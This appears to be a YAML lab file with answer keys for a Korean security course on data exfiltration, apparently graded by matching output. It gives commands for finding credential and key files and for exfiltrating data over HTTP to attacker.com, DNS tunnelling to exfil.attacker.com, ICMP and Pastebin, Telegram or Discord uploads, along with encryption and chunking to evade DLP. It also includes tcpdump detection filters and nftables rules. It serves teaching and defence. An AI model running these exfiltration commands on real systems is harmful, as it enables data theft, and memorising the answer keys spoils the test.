lab_id: attack-nonai-week11
title: 데이터 유출 (Data Exfiltration)
version: non-ai
course: attack-nonai
week: 11
description: 침해된 시스템에서 민감한 데이터를 외부로 유출하는 다양한 기법을 실습한다. HTTP, DNS, ICMP 터널링, 스테가노그래피
  등 탐지를 회피하는 유출 기법과 방어 방법을 학습한다.
difficulty: medium
duration_minutes: 120
objectives:
- 데이터 유출의 다양한 채널(HTTP, DNS, ICMP)을 이해한다
- 인코딩과 암호화를 통한 은밀한 데이터 전송을 수행할 수 있다
- DLP(Data Loss Prevention) 관점에서 유출 탐지 방법을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과 데이터
    파일을 검색하라.
  hint: find 명령으로 .conf, .env, .key, .pem 등의 파일을 검색한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf"
    -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null
    | head -20' 2>/dev/null
  answer_detail: 데이터 유출의 첫 단계는 가치 있는 데이터를 식별하는 것이다. 설정 파일(자격 증명), 키 파일(인증서), 데이터 덤프(SQL)
    등이 주요 대상이다. MITRE ATT&CK의 Collection 전술에 해당한다.
  verify:
    type: output_contains
    expect: /
    field: stdout
  target_vm: attacker
- order: 2
  instruction: JuiceShop에서 SQL Injection을 통해 사용자 데이터를 추출하고, 결과를 파일로 저장하라.
  hint: 이전 week에서 배운 SQLi 기법으로 사용자 정보를 추출한다
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
    users=json.load(sys.stdin)[''data'']; [print(f\"{u[''id'']},{u[''email'']}\")
    for u in users]" > /tmp/exfil_users.csv && echo ''Extracted users:'' && wc -l
    /tmp/exfil_users.csv && head -5 /tmp/exfil_users.csv'
  answer_detail: 데이터 추출 후 CSV나 JSON 형식으로 저장하면 후속 처리가 용이하다. 실전에서는 대량 데이터를 청크로 나누어 점진적으로
    유출하여 탐지를 회피한다.
  verify:
    type: output_contains
    expect: Extracted users
    field: stdout
  target_vm: attacker
- order: 3
  instruction: 추출한 데이터를 Base64로 인코딩하여 전송 준비를 하라.
  hint: base64 명령으로 파일을 인코딩한다
  category: exploit
  points: 10
  answer: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo 'Original size:'
    && wc -c /tmp/exfil_users.csv && echo 'Encoded size:' && wc -c /tmp/exfil_encoded.txt
    && echo 'Preview:' && head -3 /tmp/exfil_encoded.txt
  answer_detail: Base64 인코딩은 바이너리 데이터를 텍스트로 변환하여 텍스트 기반 채널(HTTP, DNS)을 통해 전송할 수 있게
    한다. 크기가 약 33% 증가하지만, DLP 시스템의 패턴 매칭을 회피할 수 있다.
  verify:
    type: output_contains
    expect: Original size
    field: stdout
  target_vm: attacker
- order: 4
  instruction: HTTP POST 요청을 통한 데이터 유출을 시뮬레이션하라. curl로 인코딩된 데이터를 외부 서버에 전송하는 방법을 시연하라.
  hint: curl -X POST -d @파일 형태로 데이터를 전송한다
  category: exploit
  points: 10
  answer: 'echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl -X
    POST -d @/tmp/exfil_encoded.txt http://attacker.com/collect'' && echo ''---''
    && echo ''With headers disguise:'' && echo ''curl -X POST -H "Content-Type: application/json"
    -d "{\"log\":\"$(head -1 /tmp/exfil_encoded.txt)\"}" http://attacker.com/api/logs''
    && echo ''---'' && echo ''HTTP exfil detected by: proxy logs, DLP, unusual POST
    sizes'''
  answer_detail: HTTP를 통한 데이터 유출은 정상 웹 트래픽과 구분하기 어렵다. JSON API 요청으로 위장하거나 정상적인 클라우드
    서비스(pastebin, cloud storage)를 경유하면 탐지가 더 어려워진다.
  verify:
    type: output_contains
    expect: HTTP Exfiltration
    field: stdout
  target_vm: attacker
- order: 5
  instruction: DNS 터널링을 통한 데이터 유출의 원리를 이해하라. 데이터를 DNS 쿼리의 서브도메인으로 인코딩하는 방법을 시연하라.
  hint: 데이터를 hex/base32로 인코딩하여 DNS 쿼리에 포함한다
  category: exploit
  points: 10
  answer: 'DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''===
    DNS Tunneling Simulation ==='' && echo "Original: $DATA" && echo "Encoded: $ENCODED"
    && echo "DNS query: dig $ENCODED.exfil.attacker.com" && echo ''---'' && echo ''Real
    tools: iodine, dnscat2, DNSExfiltrator'' && echo ''Detection: unusually long DNS
    queries, high query volume to single domain'''
  answer_detail: 'DNS 터널링은 데이터를 DNS 쿼리의 서브도메인으로 인코딩하여 전송한다. DNS는 거의 모든 네트워크에서 허용되므로
    방화벽 우회에 효과적이다. 탐지: 비정상적으로 긴 도메인명, 단일 도메인에 대한 과다 쿼리.'
  verify:
    type: output_contains
    expect: DNS Tunneling
    field: stdout
  target_vm: attacker
- order: 6
  instruction: ICMP 터널링의 원리를 이해하기 위해 ping 패킷에 커스텀 데이터를 포함하여 전송하라.
  hint: ping -p 옵션으로 패턴 데이터를 지정할 수 있다
  category: exploit
  points: 10
  answer: 'echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data in
    ICMP payload:'' && DATA_HEX=$(echo -n ''EXFIL'' | xxd -p) && echo "Data hex: $DATA_HEX"
    && ping -c 1 -p $DATA_HEX 10.20.30.80 2>&1 | head -5 && echo ''---'' && echo ''Tools:
    icmpsh, ptunnel, icmptunnel'' && echo ''Detection: unusual ICMP packet sizes,
    high ICMP volume'''
  answer_detail: 'ICMP 터널링은 ping 패킷의 데이터 영역에 정보를 삽입하여 전송한다. 방화벽이 TCP/UDP를 차단해도 ICMP는
    허용하는 경우가 많다. 탐지: 비정상적인 ICMP 패킷 크기와 빈도를 모니터링한다.'
  verify:
    type: output_contains
    expect: ICMP Tunneling
    field: stdout
  target_vm: attacker
- order: 7
  instruction: 데이터를 암호화하여 유출하는 방법을 시연하라. openssl로 AES-256 암호화를 적용하라.
  hint: openssl enc -aes-256-cbc 옵션으로 파일을 암호화한다
  category: exploit
  points: 10
  answer: 'openssl enc -aes-256-cbc -salt -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin
    -pass pass:exfil_key_2026 -pbkdf2 2>/dev/null && echo ''Encrypted file:'' && file
    /tmp/exfil_encrypted.bin && ls -la /tmp/exfil_encrypted.bin && echo ''---'' &&
    echo ''Decryption: openssl enc -d -aes-256-cbc -in exfil_encrypted.bin -pass pass:key
    -pbkdf2'''
  answer_detail: 암호화된 데이터는 DLP 시스템의 콘텐츠 검사를 완전히 회피한다. 개인정보, 신용카드 번호 등의 패턴 매칭이 불가능해지므로,
    네트워크 행위 기반 탐지(비정상 전송 패턴)에 의존해야 한다.
  verify:
    type: output_contains
    expect: Encrypted file
    field: stdout
  target_vm: attacker
- order: 8
  instruction: 데이터를 작은 청크로 분할하여 시간을 두고 유출하는 Low-and-Slow 기법을 시연하라.
  hint: split 명령으로 파일을 분할하고 순차 전송을 시뮬레이션한다
  category: exploit
  points: 10
  answer: split -b 50 /tmp/exfil_users.csv /tmp/chunk_ && echo 'Chunks created:' &&
    ls -la /tmp/chunk_* && echo '---' && echo 'Low-and-slow exfil simulation:' &&
    for f in /tmp/chunk_*; do echo "Sending $(basename $f) ($(wc -c < $f) bytes) at
    $(date +%H:%M:%S)"; done
  answer_detail: Low-and-Slow 유출은 데이터를 작은 조각으로 나누어 긴 시간에 걸쳐 전송한다. 각 전송이 정상 트래픽과 구분되지
    않을 정도로 소량이므로 볼륨 기반 탐지를 회피한다.
  verify:
    type: output_contains
    expect: Chunks created
    field: stdout
  target_vm: attacker
- order: 9
  instruction: 스테가노그래피를 사용하여 이미지 파일에 데이터를 숨기는 기법을 시연하라.
  hint: steghide 또는 단순히 cat으로 파일을 결합한다
  category: exploit
  points: 10
  answer: 'echo ''SECRET_DATA:admin@juice-sh.op:password123'' > /tmp/secret.txt &&
    dd if=/dev/urandom bs=1024 count=10 of=/tmp/fake_image.jpg 2>/dev/null && cat
    /tmp/fake_image.jpg /tmp/secret.txt > /tmp/stego_image.jpg && echo ''Steganography
    simulation:'' && echo ''Original: '' $(wc -c < /tmp/fake_image.jpg) ''bytes''
    && echo ''With hidden data: '' $(wc -c < /tmp/stego_image.jpg) ''bytes'' && echo
    ''Extract: tail -c $(wc -c < /tmp/secret.txt) /tmp/stego_image.jpg'' && echo ''---''
    && echo ''Real tools: steghide, openstego, snow'''
  answer_detail: 스테가노그래피는 데이터를 다른 파일(이미지, 오디오, 비디오) 안에 숨기는 기법이다. 파일의 외형은 정상적이므로 콘텐츠
    검사로 탐지하기 매우 어렵다. 전문 분석 도구(binwalk, stegdetect)가 필요하다.
  verify:
    type: output_contains
    expect: Steganography simulation
    field: stdout
  target_vm: attacker
- order: 10
  instruction: curl을 사용하여 클라우드 서비스를 통한 유출을 시뮬레이션하라. pastebin 형태의 서비스로 데이터를 전송하는 명령을
    작성하라.
  hint: curl로 REST API에 데이터를 POST한다
  category: exploit
  points: 10
  answer: 'echo ''=== Cloud Service Exfiltration ==='' && echo ''Pastebin: curl -X
    POST -d "api_paste_code=$(cat /tmp/exfil_encoded.txt)" https://pastebin.com/api/api_post.php''
    && echo ''Telegram: curl -F "document=@/tmp/exfil_encrypted.bin" https://api.telegram.org/bot<TOKEN>/sendDocument?chat_id=<ID>''
    && echo ''Discord: curl -F "file=@/tmp/data.zip" https://discord.com/api/webhooks/<ID>''
    && echo ''---'' && echo ''Detection: SSL inspection, domain reputation, upload
    volume monitoring'''
  answer_detail: 클라우드 서비스(Pastebin, Google Drive, Telegram, Discord)를 경유한 유출은 HTTPS
    암호화로 콘텐츠 검사가 어렵다. DLP 솔루션의 SSL 인터셉션과 도메인 카테고리 기반 차단이 필요하다.
  verify:
    type: output_contains
    expect: Cloud Service Exfiltration
    field: stdout
  target_vm: attacker
- order: 11
  instruction: tar와 gzip으로 수집한 데이터를 아카이브하고 압축하라. 전송 크기를 최소화하라.
  hint: tar czf 명령으로 압축 아카이브를 생성한다
  category: exploit
  points: 10
  answer: tar czf /tmp/exfil_archive.tar.gz /tmp/exfil_users.csv /tmp/exfil_encoded.txt
    2>/dev/null && echo 'Archive created:' && ls -lh /tmp/exfil_archive.tar.gz &&
    echo 'Original total:' && du -ch /tmp/exfil_users.csv /tmp/exfil_encoded.txt 2>/dev/null
    | tail -1 && echo 'Compression ratio achieved'
  answer_detail: 데이터 압축은 전송 시간과 볼륨을 줄여 탐지 위험을 낮춘다. 텍스트 데이터는 90% 이상 압축될 수 있다. 암호화와
    결합하면(tar czf - | openssl enc) 콘텐츠 검사와 볼륨 분석을 모두 회피할 수 있다.
  verify:
    type: output_contains
    expect: Archive created
    field: stdout
  target_vm: attacker
- order: 12
  instruction: tcpdump를 사용하여 데이터 유출 트래픽을 탐지하는 방법을 시연하라. 비정상적으로 큰 DNS 쿼리를 필터링하라.
  hint: tcpdump으로 DNS(port 53) 트래픽을 캡처하고 패킷 크기를 분석한다
  category: analysis
  points: 10
  answer: echo '=== Exfiltration Detection ===' && echo 'DNS tunneling detection:'
    && echo 'tcpdump -i any port 53 -nn -l | awk "{if(length>200) print \"SUSPICIOUS:\",
    \$0}"' && echo '---' && echo 'HTTP exfil detection:' && echo 'tcpdump -i any port
    80 or port 443 -nn -c 10 -q' && echo '---' && echo 'ICMP exfil detection:' &&
    echo 'tcpdump -i any icmp -nn -l | awk "{if(length>100) print \"LARGE ICMP:\",
    \$0}"' && echo '---' && sudo tcpdump -c 3 -i any port 53 -nn 2>&1 | head -5
  answer_detail: 네트워크 기반 유출 탐지는 비정상적인 트래픽 패턴을 식별한다. DNS 쿼리 길이, ICMP 패킷 크기, HTTP POST
    볼륨 등이 주요 지표이다. IDS/IPS 규칙과 SIEM 상관 분석을 결합하면 효과적이다.
  verify:
    type: output_contains
    expect: Exfiltration Detection
    field: stdout
  target_vm: attacker
- order: 13
  instruction: xxd를 사용하여 데이터를 hex 인코딩하고, 복원하는 과정을 시연하라.
  hint: xxd -p로 hex 인코딩, xxd -r -p로 디코딩한다
  category: exploit
  points: 10
  answer: echo 'admin:password123' | xxd -p > /tmp/hex_exfil.txt && echo 'Hex encoded:'
    && cat /tmp/hex_exfil.txt && echo 'Decoded:' && xxd -r -p /tmp/hex_exfil.txt &&
    echo '---' && echo 'Hex encoding is useful for embedding data in URLs, cookies,
    and headers'
  answer_detail: Hex 인코딩은 Base64와 함께 데이터 변환에 자주 사용된다. URL, HTTP 헤더, 쿠키 등 다양한 채널에 데이터를
    삽입할 수 있다. 여러 인코딩을 중첩하면 패턴 매칭을 더 어렵게 만든다.
  verify:
    type: output_contains
    expect: Hex encoded
    field: stdout
  target_vm: attacker
- order: 14
  instruction: 데이터 유출 방지(DLP)를 위한 nftables 방화벽 규칙을 작성하라. 대용량 아웃바운드 전송을 제한하는 규칙을 설계하라.
  hint: nftables의 ct bytes 매처를 사용하여 연결당 전송량을 제한한다
  category: analysis
  points: 15
  answer: 'echo -e ''=== DLP Firewall Rules (nftables) ===\n\n# Rate limit outbound
    connections\nadd rule inet filter output tcp dport {80, 443} ct state new limit
    rate 10/minute burst 20 accept\nadd rule inet filter output tcp dport {80, 443}
    ct state new drop\n\n# Block DNS to non-approved servers\nadd rule inet filter
    output udp dport 53 ip daddr != 10.20.30.1 drop\n\n# Log large outbound transfers\nadd
    rule inet filter output ct bytes > 10485760 log prefix "LARGE_TRANSFER: " accept\n\n#
    Block ICMP with large payload\nadd rule inet filter output icmp type echo-request
    meta length > 100 drop'''
  answer_detail: 방화벽 기반 DLP는 아웃바운드 트래픽을 제한하여 대량 데이터 유출을 방지한다. DNS 서버를 내부로 제한하고, 대용량
    전송을 로깅하며, ICMP 페이로드 크기를 제한하는 것이 기본 정책이다.
  verify:
    type: output_contains
    expect: DLP Firewall Rules
    field: stdout
  target_vm: attacker
- order: 15
  instruction: 데이터 유출 실습 결과를 /tmp/exfiltration_report.txt에 정리하라. 유출 채널, 기법, 탐지/방어
    방안을 포함하라.
  hint: 각 유출 채널의 장단점과 탐지 가능성을 비교한다
  category: analysis
  points: 15
  answer: 'echo -e ''=== Data Exfiltration Report ===\n\n[Data Collected]\n- User
    credentials from JuiceShop API\n- Configuration files from web server\n\n[Exfiltration
    Channels]\n1. HTTP POST: Easy, blends with normal traffic\n2. DNS Tunneling: Bypasses
    most firewalls\n3. ICMP Tunneling: Often overlooked\n4. Cloud Services: HTTPS
    encrypted\n5. Steganography: Hidden in media files\n\n[Evasion Techniques]\n-
    Encryption (AES-256)\n- Encoding (Base64, Hex)\n- Chunking (Low-and-Slow)\n- Compression
    (tar.gz)\n\n[Detection/Prevention]\n1. DLP solution with SSL inspection\n2. DNS
    monitoring (query length, volume)\n3. Egress filtering (whitelist outbound)\n4.
    UEBA for anomalous data access\n5. Network traffic analysis (NTA)'' > /tmp/exfiltration_report.txt
    && cat /tmp/exfiltration_report.txt'
  answer_detail: 데이터 유출 보고서는 수집 데이터, 사용 채널, 회피 기법, 탐지/방어 방안을 종합적으로 다뤄야 한다. 조직의 가장
    가치 있는 데이터가 무엇이고, 어떤 경로로 유출될 수 있는지를 평가한다.
  verify:
    type: output_contains
    expect: Data Exfiltration Report
    field: stdout
  target_vm: attacker
